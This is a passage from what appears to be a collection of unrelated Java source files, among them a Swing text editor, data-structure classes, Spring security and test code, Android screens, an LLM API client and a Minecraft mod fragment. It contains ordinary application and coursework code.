reader = new BufferedReader(new FileReader(file));\n                        textArea.read(reader, null);\n                        reader.close();\n                    } catch (IOException ex) {\n                        ex.printStackTrace();\n                    }\n                }\n            }\n        });\n\n        support.addActionListener(new ActionListener() { \n            public void actionPerformed(ActionEvent e) {\n                try {\n                    Desktop desktop = Desktop.getDesktop();\n                    URI urlka = new URI(\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\");\n                    desktop.browse(urlka);\n                } catch (Exception ex) {\n                    ex.printStackTrace();\n                }\n            }\n        });\n\n        saveFile.addActionListener(new ActionListener() { // \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u043f\u0440\u0438 \u043d\u0430\u0436\u0430\u0442\u0438\u0438 \u043d\u0430 \u0441\u043e\u0445\u0440\u0430\u043d\u0438\u0442\u044c\n            public void actionPerformed(ActionEvent e) {\n                JFileChooser fileChooser = new JFileChooser();\n                if (fileChooser.showSaveDialog(frame) == JFileChooser.APPROVE_OPTION) {\n                    File file = fileChooser.getSelectedFile();\n                    try {\n                        BufferedWriter writing = new BufferedWriter(new FileWriter(file));\n                        textArea.write(writing);\n                        writing.close();\n                    } catch (IOException ex) {\n                        ex.printStackTrace();\n                    }\n                }\n            }\n        });\n\n        Website.addActionListener(new ActionListener() { \n            public void actionPerformed(ActionEvent e) {\n                try {\n                    HttpsServer.HttpServer();\n                    Desktop desktop = Desktop.getDesktop();\n                    URI uri = new URI(\"http://localhost:8000/main\");\n                    desktop.browse(uri);\n                } catch (Exception ex) {\n                    ex.printStackTrace();\n                }\n            }\n        });\n\n        \n        JToolBar toolBar = new JToolBar();\n        fileMenu.add(openFile);\n        fileMenu.add(saveFile);\n        fileMenu.add(support);\n        frame.setIconImage(icon.getImage());\n        fileMenu.add(Website);\n        fileMenu.add(checkBox);\n        menuBar.add(fileMenu);\n        infoBar.add(infoMenu);\n        frame.add(toolBar, BorderLayout.NORTH);\n        frame.setJMenuBar(menuBar);\n        frame.add(scrollPane, BorderLayout.CENTER);\n        frame.setVisible(true); // window visible show\n    }\n}\n",
    "package org.meetpl.recodingserver.global.common;\n\nimport com.p6spy.engine.logging.Category;\nimport com.p6spy.engine.spy.appender.MessageFormattingStrategy;\nimport org.hibernate.engine.jdbc.internal.FormatStyle;\nimport org.springframework.stereotype.Component;\n\nimport java.time.LocalDateTime;\nimport java.time.format.DateTimeFormatter;\nimport java.util.Locale;\n\n@Component\npublic class CustomP6spySqlFormatter implements MessageFormattingStrategy {\n    @Override\n    public String formatMessage(int connectionId, String now, long elapsed, String category, String prepared, String sql, String url) {\n        sql = formatSql(category, sql);\n        return String.format(\"[SQL] %s | %s | %d ms | %s \", DateTimeFormatter.ofPattern(\"yyyy-MM-dd HH:mm:ss\").format(LocalDateTime.now()), category, elapsed, formatSql(category, sql));\n    }\n\n    private String formatSql(String category, String sql) {\n        if (sql != null && !sql.trim().isEmpty() && Category.STATEMENT.getName().equals(category)) {\n            String trimmedSql = sql.trim().toLowerCase(Locale.ROOT);\n            if (trimmedSql.startsWith(\"create\") || trimmedSql.startsWith(\"alter\") || trimmedSql.startsWith(\"comment\")) {\n                sql = FormatStyle.DDL.getFormatter().format(sql);\n            }\n            sql = FormatStyle.BASIC.getFormatter().format(sql);\n            return sql;\n        }\n        return sql;\n    }\n}",
    "import java.util.ArrayList;//A Binary min heap\nimport java.util.HashMap;\n\npublic class Heap <T extends Comparable<T>> \n{\n\tArrayList<T> data = new ArrayList<>();\n\tHashMap<T, Integer> map = new HashMap<>();//Maps each element to its index in the data list. This is used for efficient retrieval of an element's position in the heap.\n\n\tpublic void add(T item) //Adds an item to the heap. It places the item at the end of the data list and then calls upheapify to restore the heap property.\n\t{\n\t\tdata.add(item);   \n\t\tmap.put(item, this.data.size() - 1);\n\t\tupheapify(data.size() - 1);\n\t}\n\n\tprivate void upheapify(int ci) //Moves an item up the heap to its correct position. It compares the item with its parent and swaps them if the item is smaller. This process is repeated until the item is in its correct position.\n\t{\n\t\tint pi = (ci - 1) / 2;\n\t\tif (isLarger(data.get(ci), data.get(pi)) > 0) \n\t\t{\n\t\t\tswap(pi, ci);\n\t\t\tupheapify(pi);\n\t\t}\n\t}\n\n\tprivate void swap(int i, int j) // Swaps two elements in the heap. It also updates the map to reflect the new positions of the swapped elements.\n\t{\n\t\tT ith = data.get(i);\n\t\tT jth = data.get(j);\n\t\t\n\t\tdata.set(i, jth);\n\t\tdata.set(j, ith);\n\t\tmap.put(ith, j);\n\t\tmap.put(jth, i);\n\t}\n\n\tpublic void display() // Prints the contents of the heap.\n\t{\n\t\tSystem.out.println(data);\n\t}\n\n\tpublic int size() //size of the heap\n\t{\n\t\treturn this.data.size();\n\t}\n\n\tpublic boolean isEmpty() //: Checks if the heap is empty.\n\t{\n\t\treturn this.size() == 0;\n\t}\n\n\tpublic T remove() //Removes and returns the root element of the heap. It swaps the root with the last element, removes the last element, and then calls downheapify to restore the heap property.\n\t{\n\t\tswap(0, this.data.size() - 1);\n\t\tT rv = this.data.remove(this.data.size() - 1);\n\t\tdownheapify(0);\n\n\t\tmap.remove(rv);\n\t\treturn rv;\n\t}\n\n\tprivate void downheapify(int pi) //Moves an item down the heap to its correct position. It compares the item with its children and swaps it with the smaller child if the item is larger. This process is repeated until the item is in its correct position.\n\t{\n\t\tint lci = 2 * pi + 1;\n\t\tint rci = 2 * pi + 2;\n\t\tint mini = pi;\n\n\t\tif (lci < this.data.size() && isLarger(data.get(lci), data.get(mini)) > 0)\n\t\t{\n\t\t\tmini = lci;\n\t\t}\n\t\t\n\t\tif (rci < this.data.size() && isLarger(data.get(rci), data.get(mini)) > 0) \n\t\t{\n\t\t\tmini = rci;\n\t\t}\n\t\t\n\t\tif (mini != pi)\n\t\t{\n\t\t\tswap(mini, pi);\n\t\t\tdownheapify(mini);\n\t\t}\n\t}\n\n\tpublic T get() //Returns the root element of the heap without removing it.\n\t{\n\t\treturn this.data.get(0);\n\t}\n\n\tpublic int isLarger(T t, T o) //Compares two elements and returns a positive value if the first is larger, indicating a violation of the heap property.\n\t{\n\t\treturn t.compareTo(o);\n\t}\n\n\tpublic void updatePriority(T pair) //Updates the position of an element in the heap to maintain the heap property. It finds the element's index using the map and then calls upheapify to move the element up or down as necessary.\n\t{\n\t\tint index = map.get(pair);\n\t\tupheapify(index);\n\t}\n}\n\n\n// basicailly forms a tree using the heap data froms a tree using the values of the gvertex and then we use bfs and dfs to find the cost and time to reach the stations ",
    "package edu.pitt.cs;\n\npublic class CatImpl implements Cat {\n\n\t// TODO: Fill in with member variables\n\tint CatId;\n\tString CatName;\n\tboolean rented;\n\t\n\n\tpublic CatImpl(int id, String name) {\n\t\t// TODO: Fill in\n\t\tCatId = id;\n\t\tCatName = name;\n\t\trented = false;\n\n\t}\n\n\t/**\n\t * Rent cat. Simply sets the _rented flag to true.\n\t */\n\tpublic void rentCat() {\n\t\t// TODO: Fill in\n\t\trented = true;\n\t\t\n\t}\n\n\t/**\n\t * Return cat. Simply sets the _rented flag to false.\n\t */\n\tpublic void returnCat() {\n\t\t// TODO: Fill in\n\t\trented = false;\n\t}\n\n\t/**\n\t * Rename cat. Simply sets the name to the new name.\n\t * \n\t * @param String name New name of the cat\n\t */\n\tpublic void renameCat(String name) {\n\t\t// TODO: Fill in\n\t\tCatName = name;\n\n\t}\n\n\t/**\n\t * Accessor for _name variable. Returns the name of this cat.\n\t * \n\t * @return String name of cat\n\t */\n\n\tpublic String getName() {\n\t\t// TODO: Fill in\n\t\treturn CatName;\n\t}\n\n\t/**\n\t * Accessor for _id variable. Returns the ID of this cat.\n\t * \n\t * @return int ID of this cat\n\t */\n\n\tpublic int getId() {\n\t\t// TODO: Fill in\n\t\treturn CatId;\n\t}\n\n\t/**\n\t * Accessor for _rented variable. Returns if cat is rented.\n\t * \n\t * @return boolean - true if rented, false otherwise\n\t */\n\n\tpublic boolean getRented() {\n\t\t// TODO: Fill in\n\t\tif(rented == true){\n\t\t\treturn true;\n\t\t}else{\n\t\t\treturn false;\n\t\t}\n\t}\n\n\t/**\n\t * Returns string version of this cat, in form: \"ID *id_num*. *name*\" Example\n\t * for cat of ID 1, name Jennyanydots: \"ID 1. Jennyanydots\"\n\t * \n\t * @return String string version of cat\n\t */\n\n\tpublic String toString() {\n\t\t// TODO: Fill in\n\t\treturn \"ID \"+CatId+\". \"+CatName;\n\t}\n\n}",
    "// LLMApiClient.java\nimport android.content.Context;\nimport android.util.Log;\n\nimport com.example.BuildConfig;\nimport com.google.gson.Gson;\nimport com.google.gson.JsonObject;\n\nimport java.io.File;\n\nimport okhttp3.MediaType;\nimport okhttp3.MultipartBody;\nimport okhttp3.RequestBody;\nimport retrofit2.Call;\nimport retrofit2.Callback;\nimport retrofit2.Response;\nimport retrofit2.Retrofit;\nimport retrofit2.converter.gson.GsonConverterFactory;\n\npublic class LLMApiClient {\n    private static final String TAG = \"LLMApiClient\";\n\n    private Retrofit retrofit;\n    private MistralService mistralService;\n    private GeminiService geminiService;\n    private OpenAIService openAIService;\n\n    public LLMApiClient(Context context) {\n        retrofit = new Retrofit.Builder()\n                .baseUrl(BuildConfig.API_BASE_URL)\n                .addConverterFactory(GsonConverterFactory.create())\n                .build();\n\n        mistralService = retrofit.create(MistralService.class);\n        geminiService = retrofit.create(GeminiService.class);\n        openAIService = retrofit.create(OpenAIService.class);\n    }\n\n    public void callLLMApi(String prompt, File pictureFile, Callback<JsonObject> callback) {\n        String apiKey = getApiKey(prompt, pictureFile);\n\n        if (pictureFile != null) {\n            callGeminiApi(apiKey, prompt, pictureFile, callback);\n        } else if (prompt.endsWith(\"(App 3)\")) {\n            String modifiedPrompt = prompt.replace(\"(App 3)\", \"\").trim();\n            callOpenAIApi(apiKey, modifiedPrompt, callback);\n        } else {\n            callMistralApi(apiKey, prompt, callback);\n        }\n    }\n\n    private void callMistralApi(String apiKey, String prompt, Callback<JsonObject> callback) {\n        RequestBody body = RequestBody.create(MediaType.parse(\"application/json\"), createRequestBody(prompt));\n        mistralService.generate(\"Bearer \" + apiKey, body).enqueue(new RetrofitCallback(callback));\n    }\n\n    private void callGeminiApi(String apiKey, String prompt, File pictureFile, Callback<JsonObject> callback) {\n        RequestBody promptBody = RequestBody.create(MediaType.parse(\"text/plain\"), prompt);\n        RequestBody requestFile = RequestBody.create(MediaType.parse(\"image/jpeg\"), pictureFile);\n        MultipartBody.Part body = MultipartBody.Part.createFormData(\"picture\", pictureFile.getName(), requestFile);\n        geminiService.generate(\"Bearer \" + apiKey, promptBody, body).enqueue(new RetrofitCallback(callback));\n    }\n\n    private void callOpenAIApi(String apiKey, String prompt, Callback<JsonObject> callback) {\n        RequestBody body = RequestBody.create(MediaType.parse(\"application/json\"), createRequestBody(prompt));\n        openAIService.generate(\"Bearer \" + apiKey, body).enqueue(new RetrofitCallback(callback));\n    }\n\n    private String getApiKey(String prompt, File pictureFile) {\n        if (pictureFile != null) {\n            return BuildConfig.API_KEY_GEMINI;\n        } else if (prompt.endsWith(\"(App 3)\")) {\n            return BuildConfig.API_KEY_OPENAI;\n        } else {\n            return BuildConfig.API_KEY_MISTRAL;\n        }\n    }\n\n    private String createRequestBody(String prompt) {\n        JsonObject requestBody = new JsonObject();\n        requestBody.addProperty(\"prompt\", prompt);\n        return new Gson().toJson(requestBody);\n    }\n\n    private static class RetrofitCallback implements Callback<JsonObject> {\n        private Callback<JsonObject> callback;\n\n        public RetrofitCallback(Callback<JsonObject> callback) {\n            this.callback = callback;\n        }\n\n        @Override\n        public void onResponse(Call<JsonObject> call, Response<JsonObject> response) {\n            if (response.isSuccessful() && response.body() != null) {\n                callback.onResponse(call, response);\n            } else {\n                onFailure(call, new RuntimeException(\"API call was not successful.\"));\n            }\n        }\n\n        @Override\n        public void onFailure(Call<JsonObject> call, Throwable t) {\n            Log.e(TAG, \"API request failed: \", t);\n            callback.onFailure(call, t);\n        }\n    }\n}\n\n// Retrofit Service Interfaces\ninterface MistralService {\n    @POST(\"/generate\")\n    Call<JsonObject> generate(@Header(\"Authorization\") String apiKey, @Body RequestBody body);\n}\n\ninterface GeminiService {\n    @Multipart\n    @POST(\"/generate\")\n    Call<JsonObject> generate(@Header(\"Authorization\") String apiKey, @Part(\"prompt\") RequestBody prompt, @Part MultipartBody.Part file);\n}\n\ninterface OpenAIService {\n    @POST(\"/generate\")\n    Call<JsonObject> generate(@Header(\"Authorization\") String apiKey, @Body RequestBody body);\n}\n",
    "public class LinearProbingHashTable {\n    private static int INITIAL_CAPACITY = 20;\n    private static final double LOAD_FACTOR_THRESHOLD = 0.7;\n\n    private String[] keys;\n    private String[] values;\n    private int size;\n\n    public LinearProbingHashTable() {\n        keys = new String[INITIAL_CAPACITY];\n        values = new String[INITIAL_CAPACITY];\n        size = 0;\n    }\n//hash function\n    private int hash(String key) {\n        int hash = 0;\n        for (char c : key.toCharArray()) {\n            hash = (hash * 31 + c) % keys.length;\n        }\n        return hash;\n    }\n//add key\n    public void put(String key, String value) {\n        if (key == null || value == null) {\n            throw new IllegalArgumentException(\"Key or value cannot be null.\");\n        }\n        if (size >= LOAD_FACTOR_THRESHOLD * keys.length) {\n            resize();\n        }\n        int index = hash(key);\n        while (keys[index] != null) {\n            if (keys[index]==key) {\n                // Key already exists, update value\n                values[index] = value;\n                return;\n            }\n            index = (index + 1) % keys.length;\n        }\n        keys[index] = key;\n        values[index] = value;\n        size++;\n    }\n//search\n    public String search(String key) {\n        int index = hash(key);\n        while (keys[index] != null) {\n            if (keys[index]==key) {\n                return values[index];\n            }\n            index = (index + 1) % keys.length;\n        }\n        return null; // Key not found\n    }\n//access value\n    public String get(String key) {\n        int index = hash(key);\n        while (keys[index] != null) {\n            if (keys[index]==key) {\n                return values[index];\n            }\n            index = (index + 1) % keys.length;\n        }\n        return null; // Key not found\n    }\n\n    public void delete(String key) {\n        int index = hash(key);\n        while (keys[index] != null) {\n            if (keys[index].equals(key)) {\n                keys[index] = null;\n                values[index] = null;\n                size--;\n                return;\n            }\n            index = (index + 1) % keys.length;\n        }\n    }\n//increase capacity\n    private void resize() {\n        int newCapacity = keys.length * 2;\n        String[] newKeys = new String[newCapacity];\n        String[] newValues = new String[newCapacity];\n\n        for (int i = 0; i < keys.length; i++) {\n            if (keys[i] != null) {\n                int newIndex = hash(keys[i]);\n                while (newKeys[newIndex] != null) {\n                    newIndex = (newIndex + 1) % newCapacity;\n                }\n                newKeys[newIndex] = keys[i];\n                newValues[newIndex] = values[i];\n            }\n        }\n\n        keys = newKeys;\n        values = newValues;\n    }\n\n    public double getLoadFactor() {\n        return (double) size / keys.length;\n    }\n\n    public void printHashTable(LinearProbingHashTable hashTable) {\n        System.out.println(\"Hash Table:\");\n        for (int i = 0; i < hashTable.keys.length; i++) {\n            if (hashTable.keys[i] != null) {\n                System.out.print(\"Index \" + i + \": \" + hashTable.keys[i] + \" -> \" + hashTable.values[i]);\n                if (hashTable.hash(hashTable.keys[i]) != i) {\n                    System.out.print(\" (Collision, rehashed to index \" + hashTable.hash(hashTable.keys[i]) + \")\");\n                }\n                System.out.println();\n            }\n        }\n        System.out.println(\"Load factor: \" + hashTable.getLoadFactor());\n        System.out.println();\n    \n}\n}\n\n\n",
    "package com.example.ecommercemarketplace.security;\n\nimport jakarta.servlet.FilterChain;\nimport jakarta.servlet.ServletException;\nimport jakarta.servlet.http.HttpServletRequest;\nimport jakarta.servlet.http.HttpServletResponse;\nimport lombok.AllArgsConstructor;\nimport org.springframework.security.authentication.AuthenticationManager;\nimport org.springframework.security.authentication.UsernamePasswordAuthenticationToken;\nimport org.springframework.security.core.Authentication;\nimport org.springframework.security.core.context.SecurityContextHolder;\nimport org.springframework.security.core.userdetails.UserDetails;\nimport org.springframework.security.core.userdetails.UserDetailsService;\nimport org.springframework.stereotype.Component;\nimport org.springframework.web.filter.OncePerRequestFilter;\n\nimport java.io.IOException;\n\n@Component\n@AllArgsConstructor\npublic class JwtAuthenticationFilter extends OncePerRequestFilter {\n\n    private JwtService jwtService;\n    private UserDetailsService customUserDetailsService;\n\n    private final static String AUTHORIZATION_HEADER = \"Authorization\";\n    private final static String BEARER_PREFIX = \"Bearer \";\n\n    @Override\n    protected void doFilterInternal(\n            HttpServletRequest request,\n            HttpServletResponse response,\n            FilterChain filterChain) throws ServletException, IOException {\n\n        String header = request.getHeader(AUTHORIZATION_HEADER);\n\n        if (header == null || !header.startsWith(BEARER_PREFIX)){\n            filterChain.doFilter(request, response);\n            return;\n        }\n\n        String jwt = header.substring(7);\n        String username = jwtService.extractEmail(jwt);\n\n        if(username != null && SecurityContextHolder.getContext().getAuthentication() == null){\n\n             UserDetails userDetails = customUserDetailsService.loadUserByUsername(username);\n\n             if (jwtService.isValid(jwt)){\n                 UsernamePasswordAuthenticationToken token = new UsernamePasswordAuthenticationToken(\n                         userDetails.getUsername(), null, userDetails.getAuthorities()\n                 );\n\n                 SecurityContextHolder.getContext().setAuthentication(token);\n             }\n\n        }\n\n        filterChain.doFilter(request, response);\n\n    }\n}\n",
    "package booking_system.rm;\n\nimport org.junit.jupiter.api.Assertions;\nimport org.junit.jupiter.api.DisplayName;\nimport org.junit.jupiter.api.Test;\n\npublic class RegexTest {\n\n    @Test\n    @DisplayName(\"Test Date Validator - valid date\")\n    public void validDateTest(){\n        Assertions.assertTrue(RegexApp.isValidDate(\"02/29/1976\"));\n    }\n\n    @Test\n    @DisplayName(\"Test Date Validator - valid short date\")\n    public void validShortDateTest(){\n        Assertions.assertTrue(RegexApp.isValidDate(\"2/29/1976\"));\n    }\n\n    @Test\n    @DisplayName(\"Test Date Validator - invalid day\")\n    public void invalidDayTest(){\n        Assertions.assertFalse(RegexApp.isValidDate(\"02/35/1977\"));\n    }\n\n    @Test\n    @DisplayName(\"Test Date Validator - invalid month\")\n    public void invalidMonthTest(){\n        Assertions.assertFalse(RegexApp.isValidDate(\"26/15/1977\"));\n    }\n\n    @Test\n    @DisplayName(\"Test Date Validator - year too early\")\n    public void invalidYearTest(){\n        Assertions.assertFalse(RegexApp.isValidDate(\"02/15/1581\"));\n    }\n\n    @Test\n    @DisplayName(\"Test Date Validator - year not yet happened\")\n    public void yearTooEarlyTest(){\n        Assertions.assertFalse(RegexApp.isValidDate(\"02/15/2088\"));\n    }\n\n    @Test\n    @DisplayName(\"Test Date Validator - current year\")\n    public void currentYearTest(){\n        Assertions.assertTrue(RegexApp.isValidDate(\"02/15/2024\"));\n    }\n\n    @Test\n    @DisplayName(\"Test not a Date\")\n    public void notADateTest(){\n        Assertions.assertFalse(RegexApp.isValidDate(\"not a date\"));\n    }\n\n}\n",
    "package com.example.ipfsdemon;\n\nimport org.junit.jupiter.api.Test;\nimport org.mockito.Mock;\nimport org.mockito.Mockito;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.test.autoconfigure.web.servlet.WebMvcTest;\nimport org.springframework.http.MediaType;\nimport org.springframework.mock.web.MockMultipartFile;\nimport org.springframework.test.web.servlet.MockMvc;\nimport org.springframework.test.web.servlet.request.MockMvcRequestBuilders;\nimport org.springframework.test.web.servlet.result.MockMvcResultMatchers;\nimport org.springframework.web.multipart.MultipartFile;\n\nimport static org.mockito.ArgumentMatchers.any;\nimport static org.mockito.Mockito.times;\nimport static org.mockito.Mockito.verify;\nimport static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;\n\n@WebMvcTest(IPFSController.class)\npublic class IPFSControllerTest {\n\n    @Autowired\n    private MockMvc mockMvc;\n\n    @Mock\n    private IPFSService ipfsService;\n\n    public IPFSControllerTest() {\n    }\n\n    @Test\n    public void testSaveText() throws Exception {\n        String filepath = \"example.txt\";\n        Mockito.when(ipfsService.saveFile(filepath)).thenReturn(\"Hash123\");\n\n        mockMvc.perform(MockMvcRequestBuilders.get(\"/?filepath=\" + filepath))\n                .andExpect(status().isOk())\n                .andExpect(MockMvcResultMatchers.content().string(\"Hash123\"));\n\n        verify(ipfsService, times(1)).saveFile(filepath);\n    }\n\n    @Test\n    public void testUploadFile() throws Exception {\n        MockMultipartFile file = new MockMultipartFile(\"file\", \"test.txt\", MediaType.TEXT_PLAIN_VALUE, \"Hello, World!\".getBytes());\n        Mockito.when(ipfsService.saveFile(any(MultipartFile.class))).thenReturn(\"Hash456\");\n\n        mockMvc.perform(MockMvcRequestBuilders.multipart(\"/upload\")\n                        .file(file))\n                .andExpect(status().isOk())\n                .andExpect(MockMvcResultMatchers.content().string(\"Hash456\"));\n\n        verify(ipfsService, times(1)).saveFile(any(MultipartFile.class));\n    }\n\n    @Test\n    public void testGetFile() throws Exception {\n        String hash = \"Hash789\";\n        byte[] content = \"File Content\".getBytes();\n        Mockito.when(ipfsService.loadFile(hash)).thenReturn(content);\n\n        mockMvc.perform(MockMvcRequestBuilders.get(\"/file/{hash}\", hash))\n                .andExpect(status().isOk())\n                .andExpect(MockMvcResultMatchers.content().bytes(content));\n\n        verify(ipfsService, times(1)).loadFile(hash);\n    }\n}\n",
    "package com.example.myapplication;\n\nimport android.content.Intent;\nimport android.os.Bundle;\nimport android.os.Handler;\nimport android.widget.ProgressBar;\nimport androidx.appcompat.app.AppCompatActivity;\n\npublic class Progressbar extends AppCompatActivity {\n    private ProgressBar progressBar;\n    private Intent intent;\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_progressbar);\n        progressBar = findViewById(R.id.progressbar1);\n        progressBar.setVisibility(ProgressBar.VISIBLE);\n\n        Intent receivedIntent = getIntent();\n        if (receivedIntent != null) {\n            String selectedText = receivedIntent.getStringExtra(\"selectedText\");\n            int selectedImage = receivedIntent.getIntExtra(\"selectedImage\", 0);\n            String selectedTextGender = receivedIntent.getStringExtra(\"selectedTextGender\");\n            int selectedImageGender = receivedIntent.getIntExtra(\"selectedImageGender\", 0);\n            Intent intent = new Intent(Progressbar.this, Texttospeech.class);\n            intent.putExtra(\"selectedText\", selectedText);\n            intent.putExtra(\"selectedImage\", selectedImage);\n            intent.putExtra(\"selectedTextGender\", selectedTextGender);\n            intent.putExtra(\"selectedImageGender\", selectedImageGender);\n\n            new Handler().postDelayed(new Runnable() {\n                @Override\n                public void run() {\n                    startActivity(intent);\n                    finish();\n                }\n            }, 3000);\n        }\n//\n//        Intent intent = getIntent();\n//        if(intent != null) {\n//            String selectedText = intent.getStringExtra(\"selectedText\");\n//            int selectedImage = intent.getIntExtra(\"selectedImage\", 0);\n\n//        Intent genderintent = getIntent();\n//        String selectedTextGender = genderintent.getStringExtra(\"selectedTextGender\");\n//        int selectedImageGender = genderintent.getIntExtra(\"selectedImageGender\", 0);\n//        intent.putExtra(\"selectedText\", selectedTextGender);\n//        intent.putExtra(\"selectedImage\", selectedImageGender);\n    }\n}\n",
    "package com.gl.generator;\n\nimport com.gl.model.MainTemplateConfig;\nimport freemarker.template.Configuration;\nimport freemarker.template.Template;\nimport freemarker.template.TemplateException;\n\nimport java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class DynamicGenerator {\n    public static void main(String[] args) throws IOException, TemplateException {\n        String projectPath = System.getProperty(\"user.dir\");\n        String inputPath = projectPath + File.separator + \"src/main/resources/templates/MainTemplate.java.ftl\";\n        String outputPath = projectPath + File.separator + \"MainTemplate/java\";\n        MainTemplateConfig mainTemplateConfig = new MainTemplateConfig();\n        mainTemplateConfig.setAuthor(\"gl\");\n        mainTemplateConfig.setLoop(false);\n        mainTemplateConfig.setOutputText(\"\u6c42\u548c\u7ed3\u679c\uff1a\");\n        doGenerate(inputPath,outputPath,mainTemplateConfig);\n    }\n\n    public static void doGenerate(String inputPath,String outputPath,Object model) throws IOException, TemplateException {\n        //new \u4e2a\u5bf9\u8c61\uff0c\u53c2\u6570\u4e3afreemarker \u7248\u672c\u53f7\n        Configuration configuration = new Configuration(Configuration.VERSION_2_3_32);\n        //\u8bbe\u7f6e\u6587\u4ef6\u6240\u5728\u8def\u5f84\u548c\u5b57\u7b26\u96c6\n        File templateDir = new File(inputPath).getParentFile();\n        configuration.setDirectoryForTemplateLoading(templateDir);\n        configuration.setDefaultEncoding(\"utf-8\");\n        //\u521b\u5efa\u6a21\u677f\u5bf9\u8c61\n        String templateName = new File(inputPath).getName();\n        Template template = configuration.getTemplate(templateName);\n\n        //\u751f\u6210\n        FileWriter out = new FileWriter(outputPath);\n        template.process(model,out);\n        //\u5173\u95ed\u8f93\u51fa\u6d41\n        out.close();\n    }\n}\n",
    "package com.placide.k8skafkaavroaepccleanarchibsmicrosaddress.domain.usecase;\n\nimport com.placide.k8skafkaavroaepccleanarchibsmicrosaddress.domain.avrobean.AddressAvro;\nimport com.placide.k8skafkaavroaepccleanarchibsmicrosaddress.domain.beans.Address;\nimport com.placide.k8skafkaavroaepccleanarchibsmicrosaddress.domain.beans.Company;\nimport com.placide.k8skafkaavroaepccleanarchibsmicrosaddress.domain.beans.Employee;\nimport com.placide.k8skafkaavroaepccleanarchibsmicrosaddress.domain.exceptions.*;\nimport com.placide.k8skafkaavroaepccleanarchibsmicrosaddress.domain.ports.input.InputAddressService;\nimport com.placide.k8skafkaavroaepccleanarchibsmicrosaddress.domain.ports.output.OutputKafkaProducerAddressService;\nimport com.placide.k8skafkaavroaepccleanarchibsmicrosaddress.domain.ports.output.OutputAddressService;\nimport com.placide.k8skafkaavroaepccleanarchibsmicrosaddress.domain.ports.output.OutputRemoteCompanyService;\nimport com.placide.k8skafkaavroaepccleanarchibsmicrosaddress.domain.ports.output.OutputRemoteEmployeeService;\nimport com.placide.k8skafkaavroaepccleanarchibsmicrosaddress.infra.adatpters.output.mapper.AddressMapper;\nimport com.placide.k8skafkaavroaepccleanarchibsmicrosaddress.infra.adatpters.output.models.AddressDto;\n\nimport java.util.List;\n\npublic class AddressUseCase implements InputAddressService {\n    private final OutputAddressService outputAddressService;\n    private final OutputKafkaProducerAddressService outputKafkaProducerAddressService;\n    private final OutputRemoteCompanyService outputRemoteCompanyService;\n    private final OutputRemoteEmployeeService outputRemoteEmployeeService;\n\n    public AddressUseCase(\n            OutputKafkaProducerAddressService outputKafkaProducerAddressService,\n            OutputAddressService outputAddressService, OutputRemoteCompanyService outputRemoteCompanyService,\n            OutputRemoteEmployeeService outputRemoteEmployeeService) {\n\n        this.outputKafkaProducerAddressService = outputKafkaProducerAddressService;\n        this.outputAddressService = outputAddressService;\n        this.outputRemoteCompanyService = outputRemoteCompanyService;\n        this.outputRemoteEmployeeService = outputRemoteEmployeeService;\n    }\n\n    private void checkAddressValidity(AddressDto addressDto) throws AddressFieldsInvalidException {\n        if (Validator.isInvalidAddress(addressDto)) {\n            throw new AddressFieldsInvalidException(ExceptionMgs.ADDRESS_FIELDS_INVALID_EXCEPTION);\n        }\n    }\n\n    private void checkAddressAlreadyExists(AddressDto addressDto) throws AddressAlreadyExistsException {\n        if (!findAddressByInfo(addressDto).isEmpty()) {\n            throw new AddressAlreadyExistsException(ExceptionMgs.ADDRESS_ALREADY_EXISTS_EXCEPTION);\n        }\n    }\n\n    /*send address event to kafka topic and consumer consumes it*/\n    @Override\n    public Address produceAndConsumeAddressAdd(AddressDto addressDto) throws\n            AddressFieldsInvalidException, AddressAlreadyExistsException {\n\n        Validator.formatAddress(addressDto);\n        checkAddressValidity(addressDto);\n        checkAddressAlreadyExists(addressDto);\n        Address address = AddressMapper.mapDtoToBean(addressDto);\n        Validator.addIdToAddress(address);\n        AddressAvro addressAvro = AddressMapper.mapBeanToAvro(address);\n        return AddressMapper.mapAvroToBean(outputKafkaProducerAddressService.sendKafkaAddressAddEvent(addressAvro));\n    }\n\n    @Override\n    public Address saveInDbConsumedAddress(Address address) {\n        return outputAddressService.saveInDbConsumedAddress(address);\n    }\n\n    @Override\n    public List<Address> findAddressByInfo(AddressDto addressDto) {\n        return outputAddressService.findAddressByInfo(addressDto);\n    }\n\n    @Override\n    public List<Address> getAllAddresses() {\n        return outputAddressService.getAllAddresses();\n    }\n\n    @Override\n    public Address getAddress(String addressID) throws AddressNotFoundException {\n        Address address = outputAddressService.getAddress(addressID);\n        if(address==null)\n            throw new AddressNotFoundException(ExceptionMgs.ADDRESS_NOT_FOUND_EXCEPTION);\n        return address;\n    }\n\n    @Override\n    public List<Address> getAddressesOfGivenCity(String city) throws AddressCityNotFoundException {\n\n        List<Address> addresses = outputAddressService.getAddressesOfGivenCity(city);\n        if (addresses.isEmpty()) {\n            throw new AddressCityNotFoundException(ExceptionMgs.ADDRESS_CITY_NOT_EXCEPTION);\n        }\n        return addresses;\n    }\n\n    /*send addressId event to kafka topic and consumer consumes it*/\n    @Override\n    public Address produceAndConsumeAddressDelete(String addressId) throws AddressNotFoundException, AddressAlreadyAssignedCompanyException,\n            AddressAlreadyAssignedEmployeeException {\n        Address address = getAddress(addressId);\n        Company company = outputRemoteCompanyService.getRemoteCompanyOnGivenAddress(address.getAddressId());\n        if (co",
    "package com.dooji.dpf;\n\nimport net.minecraft.client.MinecraftClient;\nimport net.minecraft.client.sound.PositionedSoundInstance;\nimport net.minecraft.sound.SoundEvents;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Random;\nimport java.util.Timer;\nimport java.util.TimerTask;\n\npublic class PotatoSpawner {\n    private final MinecraftClient client;\n    private final Random random = new Random();\n    private final List<Potato> potatoes = new ArrayList<>();\n    private Timer spawnTimer;\n    private int spawnInterval = 10000;\n\n    public PotatoSpawner(MinecraftClient client) {\n        this.client = client;\n    }\n\n    public void startSpawning() {\n        spawnTimer = new Timer();\n        spawnTimer.schedule(new TimerTask() {\n            @Override\n            public void run() {\n                spawnPotato();\n                spawnInterval = (int) (spawnInterval * 0.8);\n                spawnInterval = Math.max(spawnInterval, 20000);\n            }\n        }, spawnInterval, spawnInterval);\n    }\n\n    private void spawnPotato() {\n        int windowWidth = 